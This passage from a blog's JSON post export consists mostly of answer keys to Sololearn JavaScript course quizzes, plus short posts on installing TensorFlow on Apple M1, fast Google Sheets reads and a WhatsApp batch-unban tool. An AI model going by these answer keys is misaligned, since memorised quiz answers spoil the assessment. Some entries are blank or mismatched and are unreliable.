Property Names Fill in the blanks to create an object with its properties. Answer: let prop = 'foo'; let o = { [prop]: 'lol', ['b' + 'ar']: '123' }; Question: Object.assign() in ES6 What is the output of this code? const obj1 = { a: 0, b: 2, c: 4 }; const obj2 = Object.assign({c: 5, d: 6}, obj1); console.log(obj2.c, obj2.d); Answer: 46 59.1 Lesson ES6 Destructuring Question: Array Destructuring in ES6 What is the output of the following code? let names = ['John', 'Fred', 'Ann']; let [Ann, Fred, John] = names; console.log(John); Answer: Ann Question: Object Destructuring in ES6 What is the output of the following code? const obj = {one: 1, two: 2}; let {one:first, two:second} = obj; console.log(one); Answer: Error 60.1 Lesson Rest &amp; Spread Question: ES6 Rest Parameters What is the output of the following code? function magic(...nums) { let sum = 0; nums.filter(n =&gt; n % 2 == 0).map(el =&gt; sum+= el); return sum; } console.log(magic(1, 2, 3, 4, 5, 6)); Answer: 12 Question: The Spread Operator What is the output of the following code? let nums = [3, 4, 5]; let all = [1, 2, ...nums, 6]; console.log(all[3]); Answer: 4 61.1 Lesson ES6 Classes Question: Classes in ES6 Fill in the blanks to declare a class Point with a constructor initializing its x and y members. Answer: class Point { constructor(a, b) { this.x = a; this.y = b; } getX() { return this.x; } getY() { return this.y; } } Question: Class Methods in ES6 Fill in the blanks to output &quot;Rex barks.&quot; Answer: class Dog { constructor(name) { this.name = name; } bark() { console.log(this.name + ' barks.'); } } let d = new Dog('Rex'); d.bark(); Question: Inheritance in ES6 Fill in the blanks to declare a class Student which inherits from the Human class. Answer: class Human { constructor(name) { this.name = name; } } class Student extends Human { constructor(name, age) { super(name); this.age = age; } } 62.1 Lesson ES6 Map &amp; Set Question: ES6 Map What is the output of this code? Answer: 1 Question: ES6 Set Fill in the blanks to create and output a set with the values 1, 2, 3. Answer: const set = new Set(); set.add(1).add(2).add(3); for(let v of set.values()) console.log(v); 63.1 Lesson More on ES6 Question: ES6 Promises Fill in the blanks to define a function that returns a Promise object. Answer: function foo() { return new Promise((resolve, reject) =&gt; { let result = getSomeResult(); if (result) resolve('Success'); else reject('Something went wrong'); }); } Question: Iterators &amp; Generators You can exit and re-enter generator functions, and their variable bindings will be saved across re-entrances. Answer: True Question: Modules Fill in the blanks to import the following from &quot;util/calc.js&quot;: export const hit = (x, y, z) =&gt; { return x * y + z / 2; } export const degree = 50; Answer: import * as calc from &quot;util/calc&quot;; calc.hit(1, 2, calc.degree); Question: Built-in Methods What is the output of this code? const arr = ['3', '5', '8']; console.log( arr.find(x =&gt; x == 8).repeat(2) ); Answer: 88 64.1 Lesson Module 8 Quiz Question: Which of the following is not one of the new ES6 features? Answer: Hoisting Question: Fill in the blanks to declare a constant num and an arrow function calc. Answer: const num = 5; const calc = (x, y, z = num) =&gt; { return x + y + z; } Question: Fill in blanks to make the variable arr3 look like the following: [1, 2, 3, 4, 5, 6, 7, 8]. Answer: const arr1 = [1, 2, 3]; const arr2 = [5, 6, 7, 8]; let arr3 = [...arr1, 4, ...arr2]; Question: What is the output of the following code? const arr1 = [1, 2, 3, 4, 5]; const arr2 = [...arr1, 6]; const func = (...rest) =&gt; { console.log(rest.length); } func(...arr1); func(...arr2); Answer: 5 6 Question: What is the output of this code? const square = num =&gt; num * num; console.log(square(6) + 6); Answer: 42 Question: Fill in the blanks to copy the user object to the newUser object by destructuring the name and age properties. Pass the value 9999 for the id property. Answer: const user = { name: 'David', age: 28, id: 1234 }; let newUser = Object.assign({}, { name, age } = user, { id: 9999 }); console.log(newUser); Question: Fill in the blanks to get the following output: zero = 0 one = 1 Answer: let myMap = new Map(); myMap.set('zero', 0); myMap.set('one', 1); for (let [key, value] of myMap) { console.log(`${key} = ${value}`); } ","tags":[{"name":"Sololearn","slug":"sololearn","used":true,"link":"https://dev-coco.github.io/tag/sololearn/"}],"title":"Sololearn JavaScript course ECMAScript 6 answers","feature":"https://dev-coco.github.io/post-images/Sololearn-Javascript-Course.jpg","link":"https://dev-coco.github.io/post/Sololearn-Javascript-Course-ECMAScript6-Answers/","stats":{"text":"7 min read","time":414000,"words":1106,"minutes":7},"date":"2022-10-19 22:00:15","dateFormat":"2022-10-19"},{"content":"Sololearn JavaScript course DOM &amp; Events answers .q,.a{font-weight:bold;}.q{color:red;}.a{color:green} Here are all the questions and answers that I hope will help you learn JavaScript course. Sololearn JavaScript course Overview answers Sololearn JavaScript course Basic Concepts answers Sololearn JavaScript course Conditionals and Loops answers Sololearn JavaScript course Functions answers Sololearn JavaScript course Objects answers Sololearn JavaScript course Core Objects answers Sololearn JavaScript course ECMAScript 6 answers 45.1 Lesson What is DOM? Question: The DOM What is DOM? Answer: Document Object Model Question: DOM Tree In the following HTML, which element is the parent of h1? &lt;body&gt; &lt;p&gt; &lt;h1&gt;Hi&lt;/h1&gt; &lt;/p&gt; &lt;/body&gt; Answer: p Question: The document Object Select all that apply: Answer: The document object is the root of the DOM innerHTML is a property 46.1 Lesson Selecting Elements Question: Selecting Elements Fill in the blanks to select the element with id=&quot;text&quot; and change its content to &quot;Hi&quot;. Answer: var ob = document.getElementById(&quot;text&quot;); ob.innerHTML = &quot;Hi&quot;; Question: Selecting Elements Fill in the blanks to select all div elements and alert the content of the third div. Answer: var arr = document.getElementsByTagName(&quot;div&quot;); alert(arr[2].innerHTML); Question: Working with DOM Can a node in the DOM have multiple parent nodes? Answer: No 47.1 Lesson Changing Elements Question: Changing Attributes Fill in the blanks to select all images of the page and change their src attribute. Answer: var arr = document. getElementsByTagName(&quot;img&quot;); for(var x=0; x &lt; arr.length; x++) { arr[x].src = &quot;demo.jpg&quot;; } Question: Changing Style Fill in the blanks to change the background color of all span elements of the page. Answer: var s = document.getElementsByTagName(&quot;span&quot;); for (var x = 0; x &lt; s.length; x++) { s[x].style.backgroundColor = &quot;#33EA73&quot;; } 48.1 Lesson Adding &amp; Removing Elements Question: Creating Elements Drag and drop from the options below to add a new &lt;li&gt; element to the unordered list with id=&quot;list&quot;. Answer: var el = document.createElement(&quot;li&quot;); var txt = document.createTextNode(&quot;B&quot;); el.appendChild(txt); var ul = document.getElementById(&quot;list&quot;); ul.appendChild(el); Question: Removing Elements Drag and drop from the options below to remove the node element from the page (par is node's parent). Answer: var par = document.getElementById(&quot;par&quot;); var node = document.getElementById(&quot;node&quot;); par.removeChild(node); Question: Replacing Elements Which method is used to replace nodes? Answer: replaceChild 49.1 Lesson Creating Animations Question: Animations To create an animation relative to a container, the position attribute for the container should be set to: Answer: relative Question: Animations What is the interval for this timer? var t = setInterval(func, 10000); Answer: 10 seconds Question: Animations Which function is used to stop a setInterval timer? Answer: clearInterval 50.1 Lesson Handling Events Question: Events The type of function that executes when an event occurs is called: Answer: event handler Question: Handling Events Fill in the blanks to call func() when the button is clicked. Answer: &lt;button onclick=&quot;func()&quot;&gt; Click Here &lt;/button&gt; Question: Events Drag and drop from the options below to call the clear() function after body is loaded. Answer: &lt;body onload=&quot;clear()&quot;&gt; &lt;/body&gt; Question: Event Listeners Can multiple event handlers be added to a single element? Answer: Yes 51.1 Lesson Event Propagation Question: Event Propagation A paragraph is inside a div element. You want the paragraph’s click event to be handled first. You should use: Answer: Bubbling Question: Capturing vs. Bubbling Drag and drop from the options below to handle the click event and use capturing propagation. Answer: x.addEventListener(&quot;click&quot;, func, true); 52.1 Lesson Creating an Image Slider Question: Image Slider Fill in the blanks to define an array. Answer: var arr = ['A', 'B', 'C']; Question: Image Slider What will be the content of the paragraph after the user clicks on it twice? &lt;p id='txt' onclick='test();'&gt;20&lt;/p&gt; &lt;script&gt; function test() { var x=document.getElementById('txt'); var n = x.innerHTML; x.innerHTML = n/2; } &lt;/script&gt; Answer: 5 53.1 Lesson Form Validation Question: Form Validation The form will submit to its action if onsubmit returns: Answer: true 54.1 Lesson Module 7 Quiz Question: Fill in the blanks to change the content of all paragraph tags of the page to &quot;SoloLearn&quot;. Answer: var arr = document.getElementsByTagName(&quot;p&quot;); for(var x=0; x &lt; arr.length; x++){ arr[x].innerHTML=&quot;SoloLearn&quot;; } Question: What is the output of this code? &lt;div id=&quot;test&quot;&gt; &lt;p&gt;some text&lt;/p&gt; &lt;/div&gt; &lt;script&gt; var el=document.getElementById(&quot;test&quot;); alert(el.hasChildNodes()); &lt;/script&gt; Answer: true Question: Drag and drop from the options below to change the color of the paragraph with id=&quot;p2&quot; to red. Answer: &lt;script&gt; var d = document.getElementById(&quot;p2&quot;); d.style.color=&quot;red&quot;; &lt;/script&gt; Question: Can you handle multiple events on the same HTML element? Answer: Yes Question: Fill in the blanks to alert a message when the button is clicked. Answer: &lt;button onclick=&quot;msg()&quot;&gt;Click me&lt;/button&gt; &lt;script&gt; function msg() { alert(&quot;Hi!&quot;); } &lt;/script&gt; Question: Display an alert when the mouse pointer is over the div tag: Answer: &lt;div onmouseover=&quot;alert('Hi!');&quot;&gt; put the mouse pointer over me &lt;/div&gt; ","tags":[{"name":"Sololearn","slug":"sololearn","used":true,"link":"https://dev-coco.github.io/tag/sololearn/"}],"title":"Sololearn JavaScript course DOM & Events answers","feature":"https://dev-coco.github.io/post-images/Sololearn-Javascript-Course.jpg","link":"https://dev-coco.github.io/post/Sololearn-Javascript-Course-DOM-and-Events-Answers/","stats":{"text":"7 min read","time":362000,"words":967,"minutes":7},"date":"2022-10-18 20:54:20","dateFormat":"2022-10-18"},{"content":"Sololearn JavaScript course Core Objects answers .q,.a{font-weight:bold;}.q{color:red;}.a{color:green} Here are all the questions and answers that I hope will help you learn JavaScript course. Sololearn JavaScript course Overview answers Sololearn JavaScript course Basic Concepts answers Sololearn JavaScript course Conditionals and Loops answers Sololearn JavaScript course Functions answers Sololearn JavaScript course Objects answers Sololearn JavaScript course DOM &amp; Events answers Sololearn JavaScript course ECMAScript 6 answers 37.1 Lesson Arrays Question: JavaScript Arrays What two keywords do we need to create an array? Answer: new Array Question: Accessing an Array What is the output of this code? var arr = new Array(3, 6, 8); document.write(arr[1]); Answer: 6 Question: Accessing an Array What is the result of trying to reference an array member which does not exist? Answer: undefined 38.1 Lesson Other Ways to Create Arrays Question: Creating Arrays Please insert the missing characters to output the third member of the array: Answer: document.write(example[2]); Question: Creating Arrays By entering var example = new Array(); we create an empty array which can be filled... Answer: anytime later 39.1 Lesson Array Properties &amp; Methods Question: The length Property Array has the &quot;length&quot; property, because it is: Answer: an object Question: Combining Arrays The &quot;concat&quot; method takes two arrays and: Answer: combines them in one new array 40.1 Lesson Associative Arrays Question: Associative Arrays In associative arrays, index numbers are replaced with: Answer: strings Question: Associative Arrays In order to use associative arrays, the &quot;associated&quot; name is put in: Answer: brackets [ ] 41.1 Lesson The Math Object Question: The Math Object In the Math Object, which of the following constants does NOT exist? Answer: Math.ABC Question: Math Object Methods In the Math Object, which of the following methods is used to calculate the square root? Answer: sqrt Question: The Math Object What is the result of the following expression: Math.sqrt(81); Answer: 9 42.1 Lesson The Date Object Question: setInterval Fill in the blanks to call the function &quot;calc()&quot; every 2 seconds: Answer: setInterval(calc, 2000); Question: The Date Object What information results from creating a Date Object? Answer: The current date and time Question: Date Methods Fill in the blanks to initialize a date object representing the current date and time: Answer: var date = new Date(); 43.1 Lesson Module 6 Quiz Question: Given the array below, please complete the expression to be alerted with &quot;apple&quot;. Answer: var fruits = new Array(&quot;pear&quot;, &quot;orange&quot;, &quot;apple&quot;, &quot;grapefruit&quot;); alert(fruits[2]); Question: What is the result of the following expression? alert(Math.sqrt(36)); Answer: 6 Question: Please fill in the blanks to output the current minutes: Answer: var date = new Date(); alert(date.getMinutes()); Question: What is the output of this code? var arr = new Array(&quot;a&quot;, &quot;b&quot;, &quot;c&quot;); alert(arr[1]); Answer: b Question: Drag and drop from the options below to get alerted with the value of the PI constant. Answer: alert(Math.PI); ","tags":[{"name":"Sololearn","slug":"sololearn","used":true,"link":"https://dev-coco.github.io/tag/sololearn/"}],"title":"Sololearn JavaScript course Core Objects answers","feature":"https://dev-coco.github.io/post-images/Sololearn-Javascript-Course.jpg","link":"https://dev-coco.github.io/post/Sololearn-Javascript-Course-Core-Objects-Answers/","stats":{"text":"4 min read","time":196000,"words":524,"minutes":4},"date":"2022-10-16 05:31:35","dateFormat":"2022-10-16"},{"content":"Sololearn JavaScript course Functions answers .q,.a{font-weight:bold;}.q{color:red;}.a{color:green} Here are all the questions and answers that I hope will help you learn JavaScript course. Sololearn JavaScript course Overview answers Sololearn JavaScript course Basic Concepts answers Sololearn JavaScript course Conditionals and Loops answers Sololearn JavaScript course Objects answers Sololearn JavaScript course Core Objects answers Sololearn JavaScript course DOM &amp; Events answers Sololearn JavaScript course ECMAScript 6 answers 24.1 Lesson User-Defined Functions Question: JavaScript Functions What is a function? Answer: Arithmetical term Question: Defining a Function Add the corresponding keyword and symbols to create a function named &quot;test&quot;. Answer: function test() { /* some code */ } Question: Calling a Function Fill in the blanks to define and call the &quot;hello&quot; function. Answer: function hello() { alert(&quot;Hi there&quot;); } hello(); Question: Calling Functions How many times can the function be executed inside a web page? Answer: As many as needed 25.1 Lesson Function Parameters Question: Function Parameters What do you need to do to create a parameter? Answer: Write a variable name in the parentheses Question: Using Parameters When and how is the parameter used? Answer: By calling the function and placing the value in the parentheses Question: Function Parameters Drag and drop from the options below to declare a function and call it, by passing &quot;Test&quot; as the argument:x Answer: function myAlert(txt) { alert(&quot;Hello &quot; + txt); } myAlert(&quot;Test&quot;); 26.1 Lesson Using Multiple Parameters with... Question: Multiple Parameters What character is used to separate parameters from each other? Answer: , Question: Multiple Parameters What is the output of this code? function test(x, y) { if(x &gt; y) { document.write(x); } else { document.write(y); } } test(5, 8); Answer: 8 Question: Multiple Parameters Fill in the blanks to create a function alerting the sum of the two parameters. Answer: function myFunction(x, y){ alert(x + y); } Question: Multiple Parameters How many times can the declared function be used? Answer: Any 27.1 Lesson The return Statement Question: Function Return When is the &quot;return&quot; statement most frequently needed? Answer: When you need to make a calculation and receive the result Question: Function Return Where is the &quot;return&quot; statement placed? Answer: At the end of the function description Question: Function Return Please enter the corresponding keyword to have the result of the function below displayed on the screen: Answer: function substrNumbrs(first, second) { var result = first - second; return result; } document.write(substrNumbrs(10, 5)); 28.1 Lesson Alert, Prompt, Confirm Question: The Alert Box How many parameters can be accepted by the &quot;alert&quot; function? Answer: 1 Question: Prompt Box Fill in the blanks to obtain the name of the user and alert it to the screen: Answer: var name = prompt(&quot;Enter your name:&quot;); alert(name); Question: Confirm Box In the &quot;confirm&quot; dialog box, &quot;OK&quot; returns true, and &quot;Cancel&quot; returns ... Answer: false 29.1 Lesson Module 4 Quiz Question: The following code will result in what value? function test (number) { while(number &lt; 5) { number++; } return number; } alert(test(2)); Answer: 5 Question: What is the output of the following expression? function multNmbrs (a, b) { var c = a*b; } multNmbrs(2, 6); Answer: Nothing Question: Please fill in the corresponding names for the built-in dialog boxes: Answer: prompt is for getting input from the user; alert is for displaying a message in a box; Question: Fill in the blanks to calculate the maximum of the parameters: Answer: function max(a, b) { if (a &gt;= b) return a; else return b; } Question: What is the correct syntax for referring to an external script called &quot;script.js&quot;? Answer: &lt;script src=&quot;script.js&quot;&gt; Question: What alert will display on the screen? function test (a, b) { if(a &gt; b) { return a*b; } else { return b / a; } } alert(test(5, 15)); Answer: 3 ","tags":[{"name":"Sololearn","slug":"sololearn","used":true,"link":"https://dev-coco.github.io/tag/sololearn/"}],"title":"Sololearn JavaScript course Functions answers","feature":"https://dev-coco.github.io/post-images/Sololearn-Javascript-Course.jpg","link":"https://dev-coco.github.io/post/Sololearn-Javascript-Course-Functions-Answers/","stats":{"text":"5 min read","time":249000,"words":664,"minutes":5},"date":"2022-10-15 06:10:07","dateFormat":"2022-10-15"},{"content":"Sololearn JavaScript course Conditionals and Loops answers .q,.a{font-weight:bold;}.q{color:red;}.a{color:green} Here are all the questions and answers that I hope will help you learn JavaScript course. Sololearn JavaScript course Overview answers Sololearn JavaScript course Basic Concepts answers Sololearn JavaScript course Functions answers Sololearn JavaScript course Objects answers Sololearn JavaScript course Core Objects answers Sololearn JavaScript course DOM &amp; Events answers Sololearn JavaScript course ECMAScript 6 answers 14.1 Lesson The if Statement Question: The if Statement Add the characters that complete the statement: Answer: if (var1 &gt; var2) { document.write(&quot;OK&quot;); } Question: The if Statement What happens if the tested condition is false? Answer: The code does nothing and moves to the next section 15.1 Lesson The else Statement Question: The else Statement The &quot;else&quot; statement is created to do what? Answer: Tell JavaScript to execute something if the condition is false Question: The else Statement Fill in the blanks to create a valid if...else statement: Answer: var age = 25; if (age &gt;= 18) { alert(&quot;Allowed.&quot;); } else { alert(&quot;Not allowed.&quot;); } 16.1 Lesson The else if Statement Question: else if What keyword is used to end the &quot;else if&quot; statement? Answer: else Question: else if Fill in the blanks to create a valid if...else...if statement: Answer: var status = 1; var msg; if (status == 1) { msg = &quot;Online&quot;; } else if (status == 2) { msg = &quot;Away&quot;; } else { msg = &quot;Offline&quot;; } 17.1 Lesson The switch Statement Question: Switch The switch statement can be used to replace… Answer: multiple if else statements Question: The switch Statement How many &quot;case&quot; statements are usually used in the &quot;switch&quot; statement? Answer: One for each possible answer Question: The break Keyword What’s the output of this code? var x = 3; switch (x) { case 1: document.write(x); break; case 2: document.write(x+2); break; default: document.write(x+5); } Answer: 8 Question: The default Keyword The &quot;default&quot; statement is used … Answer: When no match is found 18.1 Lesson The For Loop Question: Loops The classic &quot;for&quot; loop consists of how many components? Answer: 3 Question: The For Loop Fill in the blanks to compose a valid for loop: Answer: var i = 1; for (k = 1; k &lt; 10; k++) { i += k; } Question: The For Loop Fill in the blanks to print EVEN values from 0 to 20 using a for loop: Answer: var x = 0; for (; x &lt;= 20; x += 2) { document.write(x); } 19.1 Lesson The While Loop Question: The While Loop The result of the condition statement is always: Answer: A Boolean value (true or false) Question: The While Loop Fill in the blanks to print x's values from 1 to 5. Answer: var x = 1; while (x &lt;= 5) { document.write(x + &quot;&lt;br /&gt;&quot;); x = x + 1; } Question: The While Loop How many times will the while loop run, if we remove the counting variable increment statement? Answer: Infinite 20.1 Lesson The Do...While Loop Question: The Do...While Loop Apply the &quot;do&quot; and &quot;while&quot; keywords in their corresponding positions. Answer: var count=1; do { document.write(&quot;hello &lt;br /&gt;&quot;); count++; } while (count&lt;=10); 21.1 Lesson Break and Continue Question: Break The &quot;break&quot; statement: Answer: Ends the execution of the loop Question: Continue What’s the output of this code? Answer: var sum=0; for(i = 4; i &lt; 8; i++) { if (i == 6) { continue; } sum += i; } document.write(sum); 22.1 Lesson Module 3 Quiz Question: What’s the output of this code? var x = 0; while(x &lt; 6) { x++; } document.write(x); Answer: 6 Question: Fill in the right keywords to test the conditions: Answer: switch (day_of_week) { case 1: case 2: case 3: case 4: case 5: document.write(&quot;Working Days&quot;); break; case 6: document.write(&quot;Saturday&quot;); break; default: document.write(&quot;Today is Sunday&quot;); break; } Question: Please fill in the right keywords to compose a loop: Answer: do { document.write(i); i++; } while (i &lt; 10); ","tags":[{"name":"Sololearn","slug":"sololearn","used":true,"link":"https://dev-coco.github.io/tag/sololearn/"}],"title":"Sololearn JavaScript course Conditionals and Loops answers","feature":"https://dev-coco.github.io/post-images/Sololearn-Javascript-Course.jpg","link":"https://dev-coco.github.io/post/Sololearn-Javascript-Course-Conditionals-and-loops-Answers/","stats":{"text":"5 min read","time":264000,"words":704,"minutes":5},"date":"2022-10-14 11:42:05","dateFormat":"2022-10-14"},{"content":"跟着步骤安装一定能成功！ 系统要求 macOS 12.0+ 设置环境 下载和安装 Conda env chmod +x ~/Downloads/Miniforge3-MacOSX-arm64.sh sh ~/Downloads/Miniforge3-MacOSX-arm64.sh source ~/miniforge3/bin/activate 定义 Conda 变量 export conda=~/miniforge3/bin/conda 安装 TensorFlow 依赖 conda install -c apple tensorflow-deps 安装 TensorFlow python -m pip install tensorflow-macos 安装 tensorflow-metal python -m pip install tensorflow-metal ","tags":[{"index":-1,"name":"macOS","slug":"macos","used":true,"link":"https://dev-coco.github.io/tag/macos/"}],"title":"macOS M1 芯片安装 TensorFlow","feature":"","link":"https://dev-coco.github.io/post/Macos-M1-Install-Tensorflow/","stats":{"text":"1 min read","time":25000,"words":86,"minutes":1},"date":"2022-10-13 09:53:27","dateFormat":"2022-10-13"},{"content":"Sololearn JavaScript course Basic Concepts answers .q,.a{font-weight:bold;}.q{color:red;}.a{color:green} Here are all the questions and answers that I hope will help you learn JavaScript course. Sololearn JavaScript course Overview answers Sololearn JavaScript course Conditionals and Loops answers Sololearn JavaScript course Functions answers Sololearn JavaScript course Objects answers Sololearn JavaScript course Core Objects answers Sololearn JavaScript course DOM &amp; Events answers Sololearn JavaScript course ECMAScript 6 answers 7.1 Lesson Math Operators Question: Arithmetic Operators What will the following statements display? var test = 5 + 7; document.write(test); Answer: 12 Question: Multiplication What character do we use for multiplication? Answer: Question: Division What character do we use for division? Answer: / Question: The Modulus What’s the result of using a modulus operator for 38%5? Answer: 3 Question: Increment &amp; Decrement What are increment and decrement are used for? Answer: Adding or subtracting 1 from a number 8.1 Lesson Assignment Operators Question: Assignment Operators Calculate and enter the resulting value of this expression: var number = 20; number *= 5; Answer: 100 9.1 Lesson ##Comparison Operators Question: Comparison Operators What do comparison operators return? Answer: true false Question: Comparison Operators Enter the corresponding operators according to the comments at right. Answer: val1 == val2 // are equal val1 != val2 // not equal val1 &lt; val2 // less than val1 === val2 // are strict equal (identical) 10.1 Lesson Logical or Boolean Operators Question: Logical Operators Logical AND (&amp;&amp;) returns true if: Answer: If both operands are true Question: Logical Operators Logical NOT returns true, if: Answer: The operand is false 11.1 Lesson String Operators Question: String Operators What’s the output of the following code? var x = &quot;50&quot;; var y = &quot;100&quot;; document.write(x + y); Answer: 50100 12.1 Lesson Module 2 Quiz Question: Which of these names are acceptable for JavaScript variables? Answer: firstNumber _module Question: Fill in the data types of the data shown below in the comments field: Answer: 12 // number &quot;some text&quot; // string true // boolean Question: What's the result of the expression var1&amp;&amp;var2, if var1=true and var2=false? Answer: false ","tags":[{"name":"Sololearn","slug":"sololearn","used":true,"link":"https://dev-coco.github.io/tag/sololearn/"}],"title":"Sololearn JavaScript course Basic Concepts answers","feature":"https://dev-coco.github.io/post-images/Sololearn-Javascript-Course.jpg","link":"https://dev-coco.github.io/post/Sololearn-Javascript-Course-Basic-Concepts-Answers/","stats":{"text":"3 min read","time":134000,"words":359,"minutes":3},"date":"2022-10-10 08:18:40","dateFormat":"2022-10-10"},{"content":"读取大型数据必备方法！ 写入数据 先在表格内写入 100 万个单元格的数据。 function myFunction () { const arr = new Array(100000).fill(['test']) SpreadsheetApp.getActiveSpreadsheet().getSheets()[0].getRange(1, 1, arr.length, 1).setValues(arr) } 性能测试 然后来测试一下三种不同的方式获取数据的耗时。 function myFunction () { const sheet = SpreadsheetApp.getActiveSpreadsheet().getSheets()[0] console.time('getValues') sheet.getRange('A:A').getValues() console.timeEnd('getValues') console.time('getDisplayValues') sheet.getRange('A:A').getDisplayValues() console.timeEnd('getDisplayValues') console.time('sheet API') const sheetID = SpreadsheetApp.getActiveSpreadsheet().getId() Sheets.Spreadsheets.Values.get(sheetID, 'test!A:A').values console.timeEnd('sheet API') } 从测试结果可以看出 getDisplayValues 运行的速度最慢，getValues 会稍微快一点点，但是使用 Sheet API 的方法获取数据，速度要快很多。 使用方法 先添加 Google Sheets API 服务 然后使用以下代码 Sheets.Spreadsheets.Values.get(sheetID, 'test!A:A').values sheetID 是当前表格的 ID，然后后面的参数是表格的名称和范围，写法有点类似于 IMPORTRANGE 函数。 ","tags":[{"name":"Google 脚本","slug":"google-script","used":true,"link":"https://dev-coco.github.io/tag/google-script/"}],"title":"读取表格数据最快的方法","feature":"","link":"https://dev-coco.github.io/post/Fastest-Way-Read-Excel/","stats":{"text":"2 min read","time":63000,"words":235,"minutes":2},"date":"2022-10-09 19:25:38","dateFormat":"2022-10-09"},{"content":"Sololearn JavaScript course Objects answers .q,.a{font-weight:bold;}.q{color:red;}.a{color:green} Here are all the questions and answers that I hope will help you learn JavaScript course. Sololearn JavaScript course Overview answers Sololearn JavaScript course Basic Concepts answers Sololearn JavaScript course Conditionals and Loops answers Sololearn JavaScript course Functions answers Sololearn JavaScript course Core Objects answers Sololearn JavaScript course DOM &amp; Events answers Sololearn JavaScript course ECMAScript 6 answers 31.1 Lesson Introducing Objects Question: JavaScript Objects In reference to an object, color, height, weight and name are all examples of: Answer: properties Question: Object Properties What built-in property is used to count the number of characters in an object's property? Answer: length Question: Object Methods Access the &quot;color&quot; property of the &quot;hair&quot; object using dot syntax. Answer: hair.color 32.1 Lesson Creating Your Own Objects Question: The Object Constructor Fill in the blanks to create a constructor function: Answer: function movie (title, director) { this.title = title; this.director = director; } Question: Creating Objects What keyword is used for creating an instance of an object? Answer: new Question: Creating Objects Which two components are necessary in order to use information contained within an object? Answer: object's name property's name 33.1 Lesson Object Initialization Question: Object Initialization Fill in the blanks: Answer: simba = { category: &quot;lion&quot;, gender: &quot;male&quot; } Question: Using Object Initializers Complete the following expression to display the &quot;simba&quot; object's &quot;category&quot; property on the screen: Answer: document.write(simba.category); 34.1 Lesson Adding Methods Question: Methods The &quot;this&quot; keyword in the method means: Answer: The current object Question: Methods Please associate the &quot;testData&quot; constructor function below with a method called &quot;mymethod&quot;: Answer: function testData (first, second) { this.first = first; this.second = second; this.checkData = mymethod; } Question: Methods In order to use the object's properties within a function, use: Answer: The &quot;this&quot; keyword 35.1 Lesson Module 5 Quiz Question: An object's properties are similar to variables; methods are similar to: Answer: functions Question: What is the result of the following expression? var myString = &quot;abcdef&quot;; document.write(myString.length); Answer: 6 Question: Complete the expression to create an object constructor, taking into account that &quot;height&quot; and &quot;weight&quot; are properties and &quot;calculate&quot; is a method for the given object: Answer: function mathCalc (height, weight) { this.height = height; this.weight = weight; this.sampleCalc = calculate; } ","tags":[{"name":"Sololearn","slug":"sololearn","used":true,"link":"https://dev-coco.github.io/tag/sololearn/"}],"title":"Sololearn JavaScript course Objects answers","feature":"https://dev-coco.github.io/post-images/Sololearn-Javascript-Course.jpg","link":"https://dev-coco.github.io/post/Sololearn-Javascript-Course-Objects-Answers/","stats":{"text":"3 min read","time":158000,"words":422,"minutes":3},"date":"2022-10-08 17:31:54","dateFormat":"2022-10-08"},{"content":"Sololearn JavaScript course Overview answers .q,.a{font-weight:bold;}.q{color:red;}.a{color:green} Here are all the questions and answers that I hope will help you learn JavaScript course. Sololearn JavaScript course Basic Concepts answers Sololearn JavaScript course Conditionals and Loops answers Sololearn JavaScript course Functions answers Sololearn JavaScript course Objects answers Sololearn JavaScript course Core Objects answers Sololearn JavaScript course DOM &amp; Events answers Sololearn JavaScript course ECMAScript 6 answers 1.1 Lesson Your First Lesson Question: Welcome to JavaScript! What is JavaScript? Answer: a very popular programming language Question: The Console True or false? You can use the console to test code and fix bugs. Answer: True Question: Logging Messages Which command is used to log or write messages to the console? Answer: console.log() Question: Text Messages Drag and drop to send the message to the console. Answer: console.log('Testing') Question: The Code Playground Drag and drop to send the message 'Error' to the console Answer: console.log('Error'); Question: Lesson Takeaways Select the correct way to send 'Lesson Completed!' to the console Answer: console.log('Lesson Completed!') 2.1 Lesson Output Question: Output Output &quot;Hello!&quot; in the browser. Answer: &lt;script&gt; document.write(&quot;Hello!&quot;); &lt;/script&gt; Question: Output to console Complete the code to output &quot;Hi!&quot; to the console. Answer: console.log(&quot;Hi!&quot;) 3.1 Lesson Variables Question: Variables How do we tell JavaScript that we're working with a variable? Answer: var Question: Using Variables Choose the correct keyword to declare a variable and assign the value of 32. Answer: var my_variable = 32; Question: Naming Variables Which of these characters can we use to start a variable? Answer: Letters Underscore sign (_) 4.1 Lesson Comments Question: JavaScript Comments What does a single line comment look like? Answer: // this is a comment Question: Multiple-Line Comments Create a multi-line comment in JavaScript. Answer: /* this is a multiline comment */ 5.1 Lesson Data Types Question: Data Types Fill in the blanks to declare a variable age and assign it the number 18: Answer: var age = 18; Question: Strings To create a string, we need to put the text inside… Answer: Quotation marks Question: Strings Which of the following is the escape character? Answer: \\ Question: Booleans Which two values does the Boolean data type accept? Answer: false true 6.1 Lesson Module 1 Quiz Question: Fill in the blanks to output &quot;JS is cool!&quot; to the console: Answer: console.log(&quot;JS is cool!&quot;); Question: Declare a variable called x, assign the value 42 to it and output it to the console. Answer: var x = 42; console.log(x); Question: What is the output of this code? // x = 8; x = 2; // x = 3; console.log(x); Answer: 2 Question: Rearrange to form valid JavaScript code that declares a variable and outputs it to the console. Answer: &lt;script&gt; var name = &quot;James&quot;; console.log(name); &lt;/script&gt; ","tags":[{"name":"Sololearn","slug":"sololearn","used":true,"link":"https://dev-coco.github.io/tag/sololearn/"}],"title":"Sololearn JavaScript course Overview answers","feature":"https://dev-coco.github.io/post-images/Sololearn-Javascript-Course.jpg","link":"https://dev-coco.github.io/post/Sololearn-Javascript-Course-Overview-Answers/","stats":{"text":"4 min read","time":187000,"words":501,"minutes":4},"date":"2022-10-07 11:12:16","dateFormat":"2022-10-07"},{"content":"此工具非常简单易用，而且经过测试，解封成功率非常高。 工具链接：WhatsApp 快速解封 使用方法 输入 WhatsApp 号码，一行一个，格式：+区号XXXXXX，点击提交。请务必按照格式规范填写，否则不会解封成功。提交后 WhatsApp 系统大概会在 24 小时内处理。 此工具每天只限使用 100 次。 本程序使用：WhatsApp-Batch-Unbanned-Tool，源码并且修改后搭建的在线工具。为了保护用户隐私，本程序只会记录使用功能必要的内容，并且会定时删除，所以不会提供查询是否解封成功的状态，请自行查看。 ","tags":[{"name":"WhatsApp","slug":"whatsapp","used":true,"link":"https://dev-coco.github.io/tag/whatsapp/"}],"title":"WhatsApp 账号快速解封工具","feature":"","link":"https://dev-coco.github.io/post/WhatsApp-Unbaned-Tool/","stats":{"text":"1 min read","time":36000,"words":176,"minutes":1},"date":"2022-10-03 06:49:36","dateFormat":"2022-10-03"},{"content":"记录一下。 博客从创建到至今已经累计了 100 